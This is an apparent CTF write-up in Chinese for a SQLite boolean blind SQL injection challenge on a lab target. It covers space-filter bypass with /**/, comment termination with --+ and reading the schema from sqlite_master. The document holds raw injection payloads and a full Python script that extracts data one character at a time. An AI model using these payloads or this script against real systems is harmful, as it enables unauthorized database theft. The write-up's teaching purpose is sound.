---
title: SQLite 布尔盲注题解
category: SQL注入/盲注
tags: [SQLite, 布尔盲注, 脚本, /**/注释绕过, --+注释, geek]
order: 21
---

## 一句话概括

这道题是 SQLite 上的布尔盲注：页面不回显数据，但对"查到了"和"没查到"给了两套文案，把条件塞进 `name` 参数就能一位位问出数据。与 MySQL 环境相比，本题最直接的两个差异是 `/**/` 可以当作空格用（绕过空格过滤），以及 `--+` 可以直接收尾注释掉 SQL 剩余部分。

## 本题情景与解题手法

### 题目形态

题目只有一个接口 `/check.php`，通过 `GET` 的 `name` 参数查询用户。原始发包长这样：

```http
GET /check.php?name=admin/**/or/**/1=1--+ HTTP/1.1
Host: 靶机地址
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
Accept: */*
Referer: http://靶机地址/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

注意这个 payload 的两个特征：

- 条件之间没有空格，全用 `/**/` 顶上（`admin/**/or/**/1=1`）
- 结尾用 `--+` 把后面原本的 SQL 语句注释掉

页面只有两种回显：

| 布尔结果 | 回显文案 |
|---|---|
| 条件为真 | 该用户存在且活跃 |
| 条件为假 | 未找到用户或已停用 |

### 第一步：先发个简单 payload，发现被过滤

直接发一个带空格的条件（例如 `name=admin or 1=1`）会直接报错。报错而不是回显两种文案，说明空格这类字符在进入 SQL 之前就被拦掉了。后端的过滤规则认得出普通空格（或普通 payload 里的关键词），但我们的目标是让拼出来的 SQL 语法仍然合法。于是改用 `/**/` 代替空格：

```sql
admin/**/or/**/1=1
```

在 SQL 里 `/**/` 是一段注释，注释前后需要有东西分隔时，它就等价于一个空白符，所以 `admin/**/or/**/1=1` 在数据库看来和 `admin or 1=1` 是同一句。

### 第二步：确认两个回显分支就是布尔信号

把条件换成恒真、恒假两组，对比回显：

| 请求 | 回显 | 含义 |
|---|---|---|
| `?name=admin/**/or/**/1=1--+` | 该用户存在且活跃 | 恒真 → 条件成立 |
| `?name=admin/**/or/**/1=2--+` | 未找到用户或已停用 | 恒假 → 条件不成立 |

到这里，一个回显可控的布尔开关就做好了：任何能写成 SQL 逻辑表达式的条件，都可以塞进 `or` 后面，用回显文案判断真假。这就是盲注能成立的全部前提。

### 第三步：把要读的东西写成"条件"

布尔盲注本身不区分数据库，关键是要有能返回单个值的表达式。SQLite 里常用：

- `substr(表达式, 位置, 长度)` 取子串
- `unicode(表达式)` 取字符编码，便于二分
- `sqlite_master` 存放所有表结构的元数据表（表名不必猜，先盲注它读出来）

于是"猜第 1 个字符是不是 `f`"就变成了一个条件：

```sql
substr((select/**/group_concat(sql)/**/from/**/sqlite_master),1,1)='f'
```

拼进原来的位置：

```http
GET /check.php?name=admin/**/or/**/substr((select/**/group_concat(sql)/**/from/**/sqlite_master),1,1)='f'--+ HTTP/1.1
Host: 靶机地址
```

回显"该用户存在且活跃"说明第 1 个字符就是 `f`；否则换下一个候选字符继续试。

### 第四步：逐字符跑脚本

手工确认前几个字符能对上之后，把"构造条件 → 发包 → 读回显 → 命中就推进到下一位"这个循环交给脚本。完整模板见下一节。

### 注入手法一句话总结

用 `/**/` 顶替空格绕过无空格过滤，用 `or <条件>` 把真假映射成两种回显文案，条件里用 `substr()` / `unicode()` 逐字符取值，先用 `sqlite_master` 盲注出表名列名，再读数据。

## 原理

### 1. 为什么回显文案之差就够用

后端拿到 `name` 之后大概率是拼接进一条查询：

```sql
select * from <用户表> where name = '<输入>'
```

当输入被拼成 `admin/**/or/**/1=1--+` 时，实际执行的是：

```sql
select * from <用户表> where name = 'admin'/**/or/**/1=1--+'
-- --+ 之后的内容被注释掉，等价于：
select * from <用户表> where name = 'admin' or 1=1
```

`or 1=1` 让 `where` 恒成立，于是查到记录；把 `1=1` 换成 `1=2` 就是查不到。应用层分别给这两种情况输出了不同文案，回显就此变成 `where` 是否命中的信号位。

### 2. 从"二元信号"到"读出字符串"

有了信号位之后，读数据全靠把要读的东西写成条件：

| 想做的事 | 条件写法 | 备注 |
|---|---|---|
| 取某表达式的第 N 个字符 | `substr(表达式, N, 1) = 'x'` | 逐字符线性枚举 |
| 取字符编码做二分 | `unicode(substr(表达式, N, 1)) > 100` | 每字符约 7 次请求 |
| 读全部表结构 | `(select group_concat(sql) from sqlite_master)` | 一次拿到所有建表语句 |

这一步是按题面和 SQLite 通用能力推导出来的通用写法，不是跑通的现成脚本。

### 3. SQLite 环境与 MySQL 的差异

本题实际用到的是下面两点，其余仅作补充说明，避免过度推广：

- `/**/` 可当空格：这是本题绕过过滤的关键，与 MySQL 里 `/**/` 也能当内联注释或分隔符的用法一致。
- `--+` 收尾：`+` 在 URL 里被解码为空格，于是变成 `-- `，把原 SQL 后半段注释掉。
- 补充：SQLite 没有 MySQL 的 `information_schema`，元数据统一放在 `sqlite_master`（较新版本别名 `sqlite_schema`）里，字段为 `type` / `name` / `tbl_name` / `sql` 等。本题正是靠它先盲注出 `sqlite_master.sql`，从中读出真实表名与列名，再按名字去读数据。这一点属于 SQLite 的通用常识。

## 完整示例

下面是一份按本题形态推导的布尔盲注脚本模板，用 `requests` 根据 True/False 回显差异逐字符取值。

```python
import requests

BASE = "http://靶机地址/check.php"          # 靶机地址
TRUE_TEXT = "该用户存在且活跃"               # 条件为真时的回显
FALSE_TEXT = "未找到用户或已停用"            # 条件为假时的回显

CHARSET = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_{}-"


def escaped(sql: str) -> str:
    """把条件里的空格换掉：本题过滤空格，用 /**/ 顶替。
    注意：/**/ 只在“需要空白分隔符”的位置起空格作用，因此这里做等长替换。"""
    return sql.replace(" ", "/**/")


def inject(sql_condition: str) -> bool:
    """把 SQL 条件塞进 or 后面，返回该条件是否为真。

    为什么不在 requests 的 params 里传参：params 会把 /**/ 和 --+ 重新编码，
    这里直接拼完整 URL，保持 payload 原样（requests 对 URL 字符串中
    已合法的字符不会再动，只有 <、>、空格等会按需编码，服务端解码后不影响语义）。
    """
    condition = escaped(sql_condition)
    url = f"{BASE}?name=admin/**/or/**/{condition}--+"
    r = requests.get(url)
    if TRUE_TEXT in r.text:
        return True
    if FALSE_TEXT in r.text:
        return False
    raise RuntimeError(f"回显既非真也非假，可能被过滤或报错: {r.text[:200]}")


def blind(expr: str, max_len: int = 200, prefix: str = "") -> str:
    """对任意 SQL 表达式逐字符盲注，返回其字符串值。

    expr 是一个“返回单个值”的 SQL 表达式，例如
        '(select group_concat(sql) from sqlite_master)'
    外层不再额外加引号——引号由这里拼，避免和 expr 内部冲突。
    """
    result = prefix
    for pos in range(len(prefix) + 1, max_len + 1):
        for ch in CHARSET:
            if inject(f"substr({expr},{pos},1)='{ch}'"):
                result += ch
                print(f"[+] 第 {pos} 位 = {ch!r} -> {result}")
                break
        else:
            print(f"[-] 第 {pos} 位在字符集中未命中，判定已读完")
            break
    return result


if __name__ == "__main__":
    # 0) 健全性检查：恒真必须真、恒假必须假，否则说明过滤规则/回显变了
    assert inject("1=1") is True,  "恒真条件未回显真——检查过滤规则或回显文案"
    assert inject("1=2") is False, "恒假条件未回显假——检查过滤规则或回显文案"
    print("[*] 布尔信号确认可用")

    # 1) 先盲注 sqlite_master 里的建表语句，
    #    从中读出真实的表名、列名，避免脚本里写死模板里的名字。
    schema = blind("(select group_concat(sql) from sqlite_master)")
    print("[*] 表结构:\n", schema)

    # 2) 按上一步读出的表名/列名替换下面这行，再去读目标字段
    #    例如表叫 users、列叫 secret：
    #    flag = blind("(select group_concat(secret) from users)")
    #    print("[*] 结果:", flag)
```

代码里几个设计的理由：

- 条件里不出现空格：`escaped()` 统一把空格换成 `/**/`，因为本题过滤的就是空格；`substr((select/**/group_concat(sql)/**/from/**/sqlite_master),1,1)` 这种写法在语法上完全等价于带空格的版本。
- 恒真与恒假先自检：`assert inject("1=1")` 和 `inject("1=2")` 用来确认布尔信号仍然成立。如果这一步就挂了，后面所有猜解结果都不可信。
- 先读 `sqlite_master` 再读数据：不猜表名，让数据库自己把建表语句交出来。
- 线性枚举换二分：模板为了好读用了逐字符枚举（最坏一个字符 `len(CHARSET)` 次请求）。数据量大时把条件换成 `unicode(substr(...))>{mid}` 做二分，每字符约 7 次请求即可。

## 注意事项

- 脚本是按题面推导出的模板，未在靶场实测，实际使用时需要根据靶场的过滤规则和回显文案微调。
- 回显文案以靶场实际为准：真分支的文案有"该用户存在自活跃"与"该用户存在且活跃"两种写法，从上下文看（假分支是"未找到用户或已停用"，两句对仗）后者更合理。脚本里的 `TRUE_TEXT` 请按页面实际返回核对，别照抄。
- 判断回显优先用"点不动"的特征：如果两种状态的响应长度差异明显，用 `len(r.text)` 比较比匹配中文更抗干扰；中文文案若被 `\uXXXX` 转义，`requests` 会自动解码，直接比中文即可。
- 空格不是唯一被过滤的字符：本题的 `/**/` 只是解决空格。如果报错依旧，按 `过滤绕过-空格与关键字` 里的顺序排查：换行符 `%0A`、`%09`、括号包裹、大小写混淆等。
- 注释符也可能被拦：`--+` 不生效时可以试 `#`、`%23`，或者干脆让 payload 前后自洽、不用注释。
- `sqlite_master.sql` 可能很长：`group_concat` 默认拼起来会很长，必要时按 `tbl_name` 过滤（`where tbl_name='xxx'`）逐表读，脚本的 `max_len` 也要留够。
- SQLite 不区分库：一个文件就是一个库，没有 `database()` 这种切库概念，元数据只有 `sqlite_master`（或 `sqlite_schema`）。
